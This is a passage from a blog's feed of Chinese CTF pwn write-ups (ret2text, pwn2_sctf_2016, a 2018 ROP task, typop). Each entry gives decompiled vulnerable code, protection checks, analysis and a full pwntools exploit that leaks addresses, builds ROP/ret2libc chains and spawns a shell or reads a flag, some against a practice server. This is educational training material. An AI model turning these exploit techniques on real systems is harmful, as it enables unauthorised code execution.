    No PIE (0x400000)</span><br></pre></td></tr></table></figure><h2 id="3-exploit">3.exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29534</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./fm&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset=<span class="number">0x88</span></span><br><span class="line">backdoor=elf.symbols[<span class="string">&#x27;good_game&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=cyclic(offset)+p64(backdoor)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;摘要&quot;&gt;摘要&lt;/h2&gt;
&lt;p&gt;x64下的ret2text,点击就送.&lt;/p&gt;
&lt;h2 id=&quot;1-逆向&quot;&gt;1.逆向&lt;/h2&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span </summary>
      
    
    
    
    <category term="题解" scheme="https://www.fomal.cc/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>pwn2_sctf_2016</title>
    <link href="https://www.fomal.cc/posts/99047fec.html"/>
    <id>https://www.fomal.cc/posts/99047fec.html</id>
    <published>2023-04-09T12:12:41.445Z</published>
    <updated>2023-04-09T14:49:45.450Z</updated>
    
    <content type="html"><![CDATA[<h2 id="摘要">摘要</h2><p>ret2libc3加整数溢出题目,一开始思路没打开以为是ret2syscall.</p><h2 id="1-逆向">1.逆向</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> nptr[<span class="number">32</span>]; <span class="comment">// [esp+1Ch] [ebp-2Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp+3Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;How many bytes do you want me to read? &quot;</span>);</span><br><span class="line">  get_n((<span class="type">int</span>)nptr, <span class="number">4u</span>);</span><br><span class="line">  v2 = atoi(nptr);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt; <span class="number">32</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;No! That size (%d) is too large!\n&quot;</span>, v2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Ok, sounds good. Give me %u bytes of data!\n&quot;</span>, v2);</span><br><span class="line">  get_n((<span class="type">int</span>)nptr, v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;You said: %s\n&quot;</span>, nptr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> vuln();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-漏洞分析">2.漏洞分析</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  Arch:     i386-32-little</span><br><span class="line">  RELRO:    Partial RELRO</span><br><span class="line">  Stack:    No canary found</span><br><span class="line">  NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>惯例检查,并没有开比较麻烦的防护.这里看似不能进行栈溢出的利用,但是<code>get_n</code>的第二个参数是无符号整型,中间有一个强制转换的漏洞,如果我们直接把第二个参数一开始设置为负数就可以跳过判断长度的程序进行下一次输入,在下一次输入之前会有一个强制类型转换,完成整数溢出的利用.还有一个就是在泄露got表地址的时候<code>printf()</code>可以当作<code>puts</code>来使用,方法和效果是一样的.</p><h2 id="3-exploit">3.exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25105</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset=<span class="number">0x2C</span>+<span class="number">0x4</span></span><br><span class="line">prt_plt=elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">prt_got=elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">main=elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=cyclic(offset)+p32(prt_plt)+p32(main)+p32(prt_got)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;How many bytes do you want me to read? &#x27;</span>,<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">io.recvline()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvline()</span><br><span class="line"></span><br><span class="line">plt_addr=u32(io.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;printf&#x27;</span>,plt_addr)</span><br><span class="line">base=plt_addr-libc.dump(<span class="string">&#x27;printf&#x27;</span>)</span><br><span class="line">system=base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=cyclic(offset)+p32(system)+p32(<span class="number">0xdeadbeef</span>)+p32(bin_sh)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;How many bytes do you want me to read? &#x27;</span>,<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">io.recvline()</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>io.interactive()</p>  <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line">  </span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;摘要&quot;&gt;摘要&lt;/h2&gt;
&lt;p&gt;ret2libc3加整数溢出题目,一开始思路没打开以为是ret2syscall.&lt;/p&gt;
&lt;h2 id=&quot;1-逆向&quot;&gt;1.逆向&lt;/h2&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class</summary>
      
    
    
    
    <category term="题解" scheme="https://www.fomal.cc/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>铁人三项(第五赛区)_2018_rop</title>
    <link href="https://www.fomal.cc/posts/e9e8a63.html"/>
    <id>https://www.fomal.cc/posts/e9e8a63.html</id>
    <published>2023-04-09T10:13:34.860Z</published>
    <updated>2023-04-09T10:15:46.735Z</updated>
    
    <content type="html"><![CDATA[<h2 id="摘要">摘要</h2><p>x86简单ROP题,拿来复习一下工具</p><h2 id="1-逆向">1.逆向</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">136</span>]; <span class="comment">// [esp+10h] [ebp-88h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">256u</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  be_nice_to_people();</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">&quot;Hello, World\n&quot;</span>, <span class="number">0xD</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-漏洞分析">2.漏洞分析</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">  RELRO:    Partial RELRO</span><br><span class="line">  Stack:    No canary found</span><br><span class="line">  NX:       NX enabled</span><br><span class="line">  PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>x86的程序只开了部分RELRO和NX保护,发现有很明显的栈溢出漏洞,IDA里没有发现<code>system()</code>和<code>bin/sh</code>,这里也没有多余的花样.直接泄露一下got然后找一下glibc版本布置一下ROP就能拿到shell了,最后附上exp.</p><h2 id="3-exploit">3.exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25522</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset=<span class="number">0x88</span>+<span class="number">0x4</span></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main=<span class="number">0x80484C6</span></span><br><span class="line"></span><br><span class="line">payload=cyclic(offset)+p32(write_plt)+p32(main)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>) <span class="comment">##只要发送四个就够了</span></span><br><span class="line"></span><br><span class="line">pause(<span class="number">1</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_addr=u32(io.recv(<span class="number">4</span>)) <span class="comment">##接收也是四个</span></span><br><span class="line">info(<span class="string">&quot;write:&quot;</span>+(<span class="built_in">str</span>)(write_addr))</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">base=write_addr-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system=base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=cyclic(offset)+p32(system)+p32(<span class="number">0xdeadbeef</span>)+p32(bin_sh)</span><br><span class="line"></span><br><span class="line">pause(<span class="number">1</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;摘要&quot;&gt;摘要&lt;/h2&gt;
&lt;p&gt;x86简单ROP题,拿来复习一下工具&lt;/p&gt;
&lt;h2 id=&quot;1-逆向&quot;&gt;1.逆向&lt;/h2&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span c</summary>
      
    
    
    
    <category term="题解" scheme="https://www.fomal.cc/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>typop Write Up</title>
    <link href="https://www.fomal.cc/posts/28066d78.html"/>
    <id>https://www.fomal.cc/posts/28066d78.html</id>
    <published>2023-04-09T10:13:34.859Z</published>
    <updated>2023-04-09T10:15:46.735Z</updated>
    
    <content type="html"><![CDATA[<p>前言,本题使用了fake frame手法</p><h2 id="1-源代码">1.源代码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">getFeedback</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 buf; <span class="comment">// [rsp+Eh] [rbp-12h] BYREF</span></span><br><span class="line">  __int16 v2; <span class="comment">// [rsp+16h] [rbp-Ah]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  buf = <span class="number">0LL</span>;</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you like ctf?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">30uLL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;You said: %s\n&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( (_BYTE)buf == <span class="number">121</span> )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;That&#x27;s great! &quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Aww :( &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Can you provide some extra feedback?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x5A</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">win</span><span class="params">(<span class="type">char</span> a1, <span class="type">char</span> a2, <span class="type">char</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+18h] [rbp-58h]</span></span><br><span class="line">  _BYTE filename[<span class="number">10</span>]; <span class="comment">// [rsp+26h] [rbp-4Ah] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">8</span>]; <span class="comment">// [rsp+30h] [rbp-40h] BYREF</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+38h] [rbp-38h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+40h] [rbp-30h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+48h] [rbp-28h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+50h] [rbp-20h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+58h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v12; <span class="comment">// [rsp+68h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v12 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  filename[<span class="number">9</span>] = <span class="number">0</span>;</span><br><span class="line">  filename[<span class="number">0</span>] = a1;</span><br><span class="line">  filename[<span class="number">1</span>] = a2;</span><br><span class="line">  filename[<span class="number">2</span>] = a3;</span><br><span class="line">  <span class="built_in">strcpy</span>(&amp;filename[<span class="number">3</span>], <span class="string">&quot;g.txt&quot;</span>);</span><br><span class="line">  stream = fopen(filename, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Error opening flag file.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  *(_QWORD *)s = <span class="number">0LL</span>;</span><br><span class="line">  v7 = <span class="number">0LL</span>;</span><br><span class="line">  v8 = <span class="number">0LL</span>;</span><br><span class="line">  v9 = <span class="number">0LL</span>;</span><br><span class="line">  v10 = <span class="number">0LL</span>;</span><br><span class="line">  v11 = <span class="number">0LL</span>;</span><br><span class="line">  fgets(s, <span class="number">32</span>, stream);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v12;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="built_in">puts</span>(<span class="string">&quot;Do you want to complete a survey?&quot;</span>) &amp;&amp; getchar() == <span class="number">121</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    getchar();</span><br><span class="line">    getFeedback();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-分析漏洞">2. 分析漏洞</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>​防护全开,用IDA反编译发现有后门函数并且有可以循环调用的getfeedback函数,但是后门函数里面打开flag的文件名不完整,但是附件没给libc而且gadgets也不够布置完整的ROP来把前三个字符传进filename.不过由于getfeedback()和win()分别有buf和filename两个本地变量,而在函数的栈帧中通常用RBP来访问变量,那么就可以修改getfeedback()的RBP指向的地址和]RBP+8],即返回地址.</p><p>​那么现在的思路已经基本有了:</p><p>​第一次调用getfeedback(),在第一次输入时覆盖canary低位上的\x00,因为canary一般和栈底距离一个机器字长,所以会顺带着把previous RBP也给打印出来,这是一个栈上的地址,根据本地调试就可以计算出栈基地址来覆盖RBP,getfeedback()第一次输入只能泄露栈和canary,不过有第二次的输入可以补回canary的值防止崩溃,所以第二次输入把canary还原来进行下一次调用getfeedback();</p><p>​第二次调用getfeedback(),计算好偏移量把[RBP+8]给打印出来,通过IDA里面偏移地址计算出基地址,再根据需要算出要控制的RBP地址,老样子第二次输入补全canary;</p><p>​第三次调用getfeedback(),由于ROP链的gadget不全,所以应该是在原先getfeedback()的buf上输入filename,也就是flag.txt\x00,再通过栈溢出操控RBP和RIP把flag.txt\x00当作是filename()打开,因此覆盖用的返回地址使用的win()里面调用fopen()的起始地址,而要覆盖的RBP地址就比较随便,经过了简单的调试,发现如果把RBP跳转到可以把buf刚好当作filename读入的时候,也就是下面的exp里最后一个payload的前面10字节,当RBP被设置成这10个字节附近区域读取filename时会出现读取失败,即使flag.txt\x00已经被传入RDI,fopen()依然会调用失败,最后稍微调试一下把RBP设置成读取更高一些地址的区域作为filename时,flag被成功读取.</p><h2 id="3-exp">3.exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">&#x27;./typop&#x27;</span>)</span><br><span class="line">gdb.attach(io,<span class="string">&#x27;b main&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#泄露canary和栈地址</span></span><br><span class="line">pause(<span class="number">1</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Do you want to complete a survey?&#x27;</span>, <span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">payload = <span class="number">10</span>*<span class="string">b&#x27;y&#x27;</span></span><br><span class="line">pause(<span class="number">1</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Do you like ctf?&#x27;</span>, payload)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;y&#x27;</span>*<span class="number">10</span>)</span><br><span class="line">canary = u64(io.recv(<span class="number">8</span>))-<span class="number">0xa</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line">stack = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x10</span>+<span class="number">0x38</span> <span class="comment">#减去0x10让RBP指向的地址存放自己的地址,加上0x38让RBP读取的filename和buf对齐,不过这样改会打不开文件,所以后面再加了偏移</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack))</span><br><span class="line">payload = <span class="number">10</span>*<span class="string">b&#x27;y&#x27;</span>+p64(canary)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Can you provide some extra feedback?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#泄露程序加载基地址</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Do you want to complete a survey?&#x27;</span>, <span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Do you like ctf?&#x27;</span>, <span class="number">0x1a</span>*<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="number">0x1a</span>*<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x447</span>+<span class="number">0x298</span>+<span class="number">0x51</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#修改RBP读入文件名,获取flag</span></span><br><span class="line">payload = <span class="number">10</span>*<span class="string">b&#x27;y&#x27;</span>+p64(canary)+p64(stack+<span class="number">0x22</span>)+p64(addr)+<span class="string">b&#x27;flag.txt\x00&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">在flag.txt\x00前面有0x22字节数据,stack+0x22刚好可以让flag.txt\x00衔接在payload后面</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;Can you provide some extra feedback?&#x27;</span>, payload)</span><br><span class="line">io.recvline()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;前言,本题使用了fake frame手法&lt;/p&gt;
&lt;h2 id=&quot;1-源代码&quot;&gt;1.源代码&lt;/h2&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/s</summary>
      
    
    
    
    <category term="题解" scheme="https://www.fomal.cc/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>sh_v1.1 WP</title>
    <link href="https://www.fomal.cc/posts/456d7704.html"/>
    <id>https://www.fomal.cc/posts/456d7704.html</id>
    <published>2023-04-09T10:13:34.857Z</published>
    <updated>2023-04-09T10:15:46.736Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-伪代码">1.伪代码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-伪代码&quot;&gt;1.伪代码&lt;/h2&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class</summary>
      
    
    
    
    <category term="题解" scheme="https://www.fomal.cc/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>outBackdoor Write Up</title>
    <link href="https://www.fomal.cc/posts/d5134afd.html"/>
    <id>https://www.fomal.cc/posts/d5134afd.html</id>
    <published>2023-04-09T10:13:34.855Z</published>
    <updated>2023-04-09T10:15:46.735Z</updated>
    
